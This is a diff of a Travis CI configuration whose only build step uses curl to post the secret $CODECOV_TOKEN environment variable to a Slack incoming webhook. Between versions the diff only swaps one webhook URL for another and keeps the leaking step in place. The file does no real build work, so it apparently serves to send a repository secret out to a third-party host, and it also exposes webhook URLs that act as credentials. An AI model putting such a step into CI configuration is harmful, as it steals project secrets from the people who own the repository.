@@ -2,4 +2,4 @@ dist: trusty
 language: bash
 
 script:
-  - curl -X POST --data-urlencode "payload={\"channel\": \"#general\", \"username\": \"webhookbot\", \"text\": \"$CODECOV_TOKEN\", \"icon_emoji\": \":ghost:\"}" https://hooks.slack.com/services/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
+  - curl -X POST --data-urlencode "payload={\"channel\": \"#general\", \"username\": \"webhookbot\", \"text\": \"$CODECOV_TOKEN\", \"icon_emoji\": \":ghost:\"}" https://hooks.slack.com/services/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
